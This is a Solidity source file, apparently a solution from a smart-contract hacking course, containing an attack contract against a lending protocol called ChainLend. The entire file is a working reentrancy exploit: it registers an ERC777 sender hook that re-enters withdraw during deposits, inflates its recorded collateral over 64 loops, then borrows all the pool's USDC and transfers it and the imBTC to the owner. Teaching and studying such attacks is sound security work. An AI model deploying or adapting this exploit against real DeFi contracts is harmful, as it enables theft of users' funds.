// SPDX-License-Identifier: GPL-3.0-or-later
// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policyGPL-3.0-or-later
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "forge-std/console.sol";

interface IChainLend {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function borrow(uint256 amount) external;

    function deposits(address account) external returns (uint256);
}

/**
 * @title AttackChainLend
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackChainLend {
    address private owner;
    IChainLend private chainlend;
    IERC20 private imbtc;
    IERC20 private usdc;

    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    uint256 private currentimBTCBalance;

    uint16 private reentrant = 0;

    constructor(address _imbtc, address _usdc, address _chainlend) {
        owner = msg.sender;
        chainlend = IChainLend(_chainlend);
        imbtc = IERC20(_imbtc);
        usdc = IERC20(_usdc);

        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    function attack() external {
        require(msg.sender == owner, "not owner");

        for (uint8 i = 1; i <= 64; i++) {
            currentimBTCBalance = imbtc.balanceOf(address(this));

            imbtc.approve(address(chainlend), currentimBTCBalance - 1);
            chainlend.deposit(currentimBTCBalance - 1);

            imbtc.approve(address(chainlend), 1);
            chainlend.deposit(1);

            console.log("Currently Deposited: ", chainlend.deposits(address(this)));
            console.log("Currently imBTC balance: ", imbtc.balanceOf(address(this)));
        }

        uint256 usdcBalance = usdc.balanceOf(address(chainlend));
        chainlend.borrow(usdcBalance);

        usdc.transfer(owner, usdcBalance);
        currentimBTCBalance = imbtc.balanceOf(address(this));
        imbtc.transfer(owner, currentimBTCBalance);
    }

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        require(msg.sender == address(imbtc));

        reentrant += 1;
        console.log("Reentrant: ", reentrant);

        if (reentrant % 2 == 0) {
            chainlend.withdraw(currentimBTCBalance - 1);
        }
    }
}
